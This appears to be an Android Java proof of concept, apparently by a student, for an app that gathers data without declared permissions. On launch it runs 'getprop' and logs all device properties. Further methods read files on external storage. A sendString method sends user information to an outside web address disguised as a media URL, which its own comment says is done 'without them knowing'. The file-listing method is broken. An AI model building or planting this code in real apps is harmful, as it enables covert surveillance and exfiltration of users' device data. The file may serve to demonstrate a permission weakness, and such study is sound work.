//Cameron Wyatt
//cmw7jb@virginia.edu
package com.wyatt;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;

import android.app.Activity;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;

public class ZeroPermissionsActivity extends Activity {
	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		try {
			Thread.sleep(3000);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		getProp();
	}

	//Gets hidden information about users phone 
	public void getProp() {
		try {
			String s = "";

			Process p = Runtime.getRuntime().exec("getprop");
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(
					p.getInputStream()));

			while ((s = stdInput.readLine()) != null) {
				Log.i("User information", "getprop " + s);
			}

		} catch (IOException e) {

		}
	}

	//Lists all of the files in the current directory 
	public void listAllFiles() {
		try {
			File f = new File("ls " + Environment.getExternalStorageDirectory());
			FileInputStream fileIs = new FileInputStream(f);
			BufferedReader buf = new BufferedReader(new InputStreamReader(
					fileIs));
			String readString = "";

			while ((readString = buf.readLine()) != null) {
				Log.i("Directories and files: ", readString);
			}
		} catch (IOException e) {
		}
	}

	//Reads a file without the necessary permissions
	public void readFile(String fileName) {
		try {
			File f = new File(Environment.getExternalStorageDirectory() + "/"
					+ fileName);
			FileInputStream fileIs = new FileInputStream(f);
			BufferedReader buf = new BufferedReader(new InputStreamReader(
					fileIs));

			String readString = "";

			while ((readString = buf.readLine()) != null) {
				Log.i("file: ", readString);
			}
		} catch (IOException e) {

		}
	}

	//Makes it possible to call a URL without the necessary permission
	//Allows you to log information about the user without them knowing (BAD!)
	public void sendString(String information) {
		MediaPlayer.create(this,
				Uri.parse("http://www.mywebsite.com/" + information));
	}
}